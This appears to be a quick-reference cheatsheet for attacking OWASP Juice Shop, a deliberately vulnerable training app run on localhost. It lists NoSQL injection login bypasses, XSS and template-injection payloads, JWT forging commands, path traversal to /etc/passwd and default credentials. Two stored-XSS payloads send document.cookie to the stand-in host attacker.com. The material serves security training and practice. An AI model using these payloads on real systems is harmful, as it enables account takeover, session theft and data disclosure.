# OWASP Juice Shop - Quick Reference Cheatsheet

---

## Default Configuration

| Setting | Value |
|---------|-------|
| URL (Docker) | `http://localhost:3000` |
| URL (Kali) | `http://localhost:42000` |
| Score Board | `http://localhost:3000/#/score-board` |
| API Docs | `http://localhost:3000/api-docs` |
| Tech Stack | Node.js + Angular + SQLite |
| Node.js Versions | 22.x, 24.x, 26.x |

---

## Quick Start Commands

```bash
# Kali Linux
sudo apt install juice-shop
sudo juice-shop-start    # Port 42000
sudo juice-shop-stop

# Docker
docker pull bkimminich/juice-shop
docker run --rm -p 3000:3000 bkimminich/juice-shop

# From Source
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop && npm install && npm start
```

---

## Challenge Categories & Difficulty

| Category | Easy | Medium | Hard | Expert |
|----------|------|--------|------|--------|
| Injection | Login Admin | NoSQL Injection | API-only User | Forged JWT |
| XSS | DOM XSS | Reflected XSS | Stored XSS | - |
| Auth | Password Strength | Login Jim | Login Bender | Reset Password |
| Data Exposure | API Leak | Exposed Metrics | GDPR Export | Database Schema |
| Access Control | Product Tampering | Task List | Change Password | Delete All Users |
| Config | Privacy Policy | Extra Language | Geo Stalking | Deprecated Interface |
| XXE | - | Classic XXE | XXE DoS | - |
| Components | - | Known Vulns | Typosquatting | - |

---

## NoSQL Injection Payloads

```bash
# Authentication bypass
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":{"$gt":""}}'

curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":{"$ne":""}}'

curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$regex":"admin.*"},"password":{"$ne":""}}'

# Query bypass
curl "http://localhost:3000/api/Products?name[$ne]="
curl "http://localhost:3000/api/Users?email=admin@juice-sh.op"
```

---

## XSS Payloads

```bash
# DOM XSS
<iframe src="javascript:alert('XSS')">
<svg onload="alert('XSS')">
<img src=x onerror="alert('XSS')">

# Search XSS
<script>alert('XSS')</script>
http://localhost:3000/search?q=<script>alert('XSS')</script>

# Stored XSS (in reviews)
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

# Template injection
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

---

## JWT Attack Commands

```bash
# Decode JWT
echo "eyJhbGciOi..." | base64 -d 2>/dev/null | jq .

# jwt_tool usage
python3 jwt_tool.py <JWT> -C -d wordlist.txt
python3 jwt_tool.py <JWT> -X a
python3 jwt_tool.py <JWT> -T -S none
python3 jwt_tool.py <JWT> -T -S hs256 -pk public.pem

# JWT in browser console
localStorage.getItem('token')

# Modify JWT payload
# Change alg to "none" or "HS256" with public key
# Add {"email":"admin@juice-sh.op","role":"admin"}
```

---

## API Enumeration

```bash
# Discover endpoints
curl http://localhost:3000/api-docs
curl http://localhost:3000/swagger.yml

# Common API endpoints
curl http://localhost:3000/api/Products
curl http://localhost:3000/api/Users
curl http://localhost:3000/api/Challenges
curl http://localhost:3000/api/Feedbacks
curl http://localhost:3000/api/BasketItems
curl http://localhost:3000/api/Reviews
curl http://localhost:3000/api/Passwords
curl http://localhost:3000/rest/qrcode/image?data=test

# FTP directory
curl http://localhost:3000/ftp/coupons_2013.csv
curl http://localhost:3000/ftp/legal.md
curl http://localhost:3000/ftp/package.json.bak
```

---

## File Inclusion & Path Traversal

```bash
# Directory traversal
curl http://localhost:3000/api/Products/../../etc/passwd
curl http://localhost:3000/rest/qrcode/image?file=../../etc/passwd

# Local file inclusion
curl http://localhost:3000/rest/qrcode/image?file=/etc/passwd
curl "http://localhost:3000/rest/qrcode/image?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```

---

## Authentication Bypass

```bash
# Default credentials to test
admin@juice-sh.op / admin123
jim@juice-sh.op / ncc1701
bender@juice-sh.op / bender
mc@juice-sh.op / sunny
morty@juice-sh.op / iiniswnotgood
```

---

## Useful Burp Suite Configurations

```bash
# Proxy settings
HTTP Proxy: 127.0.0.1:8080
HTTPS Proxy: 127.0.0.1:8080

# Add to scope
http://localhost:3000/.*

# Intercept these paths
/api/*
/rest/*
```

---

## CTF Flag Capture

```bash
# Find CTF flag in product descriptions
curl http://localhost:3000/api/Products | jq '.data[].description' | grep -i flag

# Check for encoded flags
curl http://localhost:3000/api/Products | grep -oE '[a-f0-9]{32}'

# Decode base64 encoded flags
echo "RkxBR3t0ZXN0fQ==" | base64 -d
```

---

## Challenge Solving Tips

```bash
# 1. Enumerate all endpoints first
# 2. Test input validation on every parameter
# 3. Check response headers for clues
# 4. Use browser dev tools to inspect localStorage
# 5. Try API directly (bypass frontend)
# 6. Read error messages carefully
# 7. Check for information disclosure
# 8. Test for race conditions
# 9. Look for hidden functionality
# 10. Check cookies and session tokens
```

---

## Common Headers to Check

```bash
# Security headers
Content-Security-Policy
X-Frame-Options
X-Content-Type-Options
Strict-Transport-Security
X-Powered-By
Server
```

---

## Useful Tools for Juice Shop

| Tool | Use Case |
|------|----------|
| Burp Suite | HTTP proxy, scanner, intruder |
| sqlmap | SQL injection (if present) |
| jwt_tool | JWT token manipulation |
| ffuf | Directory fuzzing |
| curl | API testing |
| Postman | API development |
| jq | JSON parsing |
| CyberChef | Data encoding/decoding |
